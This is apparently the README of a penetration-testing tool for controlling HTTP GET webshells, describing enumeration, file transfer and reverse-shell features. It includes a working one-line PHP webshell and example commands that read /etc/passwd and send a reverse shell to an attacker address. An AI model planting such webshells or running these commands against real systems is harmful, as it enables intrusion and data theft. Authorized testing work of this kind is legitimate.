# Webshell Handler
A small Python tool for interacting with simple HTTP GET webshells during penetration testing.
The project provides three versions:
* **webshell_handler.py** – extended handler with enumeration, file transfer and reverse shell support.
* **webshell_handler_mini.py** – minimal interactive client.
* **webshell_handler_micro.py** – very minimal interactive client.

The scripts communicate with a remote webshell by sending commands through a specified GET HTTP parameter and printing the server response.

## Features

### webshell_handler.py
Extended version with additional functionality:
* interactive command execution
* OS detection
* Linux / Windows privilege escalation enumeration
* file download (base64)
* file upload (base64)
* reverse shell trigger
* command history
* tab completion
* recommended for more complex scenarios and when you need extra features for enumeration and post-exploitation

### webshell_handler_mini.py
Minimal interactive client:
* command execution via HTTP GET webshell
* simple interactive prompt
* graceful exit handling

### webshell_handler_micro.py
Very minimal interactive client:
* minimal command execution via HTTP GET webshell
* recommended for quick testing of simple webshells without extra features or dependencies
* for more complex scenarios, consider using the full-featured webshell_handler.py

### Feel free to modify, add new features and adapt it for your own use.

## Requirements
Python **3.10+**
Dependencies:

Uses the Python HTTP library Requests.
```bash
requests>=2.31.0

#Requirements installation:
pip install -r requirements.txt
```

## Usage

### Full handler
```bash
python3 webshell_handler.py <webshell_url> <command_parameter>

# Example:
python3 webshell_handler.py http://127.0.0.1:80/webshell.php cmd
```

### Minimal client
```bash
python3 webshell_handler_mini.py <webshell_url> <command_parameter>

# Example:
python3 webshell_handler_mini.py http://127.0.0.1:80/webshell.php cmd
```

### Micro client
```bash
python3 webshell_handler_micro.py <webshell_url> <command_parameter>

# Example:
python3 webshell_handler_micro.py http://127.0.0.1:80/webshell.php cmd
```

## Examples of Webshells
Example of a simple PHP webshell_system.php that can be used by the handler:
```php
<?php system($_GET['cmd']); ?>

# Example GET request:
http://target/webshell_system.php?cmd=id
#You can replace 'id' with any other command you want to execute at target system.
```
In webshells_php and webshells_asp directories, you can find more examples of webshells written in PHP and ASP. You can also create your own webshells in other languages (e.g. JSP) as long as they accept commands through a GET parameter and return the output in the HTTP response.

## Example Commands (Full Handler)
```bash
help
detect
enum
download /etc/passwd
upload local.txt /tmp/local.txt
rev 10.10.14.10 4444
clear
exit
```

## Disclaimer
This tool is intended **for educational purposes and authorized penetration testing only**.
Do not use it against systems without explicit permission.

## License
MIT License – see `LICENSE`.